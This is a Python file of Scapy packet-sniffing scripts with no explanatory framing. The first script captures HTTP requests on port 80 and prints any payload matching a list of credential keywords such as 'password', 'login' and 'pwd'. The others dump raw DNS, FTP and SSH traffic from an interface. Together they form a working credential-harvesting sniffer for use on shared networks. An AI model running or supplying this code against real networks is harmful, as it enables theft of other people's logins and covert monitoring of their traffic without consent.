#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode()  # Convert bytes to string using decode()
            keywords = ["username", "user", "login", "password", "pass", "usr", "userID", "uname", "email", "userPassword", "pswd", "pass", "pwd"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

sniff("eth0")



#----------------------------------------------------------Sniffing DNS packets:----------------------------------------------------------

#!/usr/bin/env python3
import scapy.all as scapy

def sniff_dns_packets(interface):
    scapy.sniff(iface=interface, filter="port 53", prn=process_dns_packet)

def process_dns_packet(packet):
    if packet.haslayer(scapy.DNS):
        dns_packet = packet[scapy.DNS]
        print(dns_packet.summary())

sniff_dns_packets("eth0")


#--------------------------------------------------Sniffing FTP packets------------------------------------------------------------------

#!/usr/bin/env python3
import scapy.all as scapy

def sniff_ftp_packets(interface):
    scapy.sniff(iface=interface, filter="port 21", prn=process_ftp_packet)

def process_ftp_packet(packet):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        ftp_packet = packet[scapy.Raw].load
        print(ftp_packet)

sniff_ftp_packets("eth0")

#---------------------------------------------------------Sniffing SSH packets-------------------------------------------------
#!/usr/bin/env python3
import scapy.all as scapy

def sniff_ssh_packets(interface):
    scapy.sniff(iface=interface, filter="port 22", prn=process_ssh_packet)

def process_ssh_packet(packet):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        ssh_packet = packet[scapy.Raw].load
        print(ssh_packet)

sniff_ssh_packets("eth0")












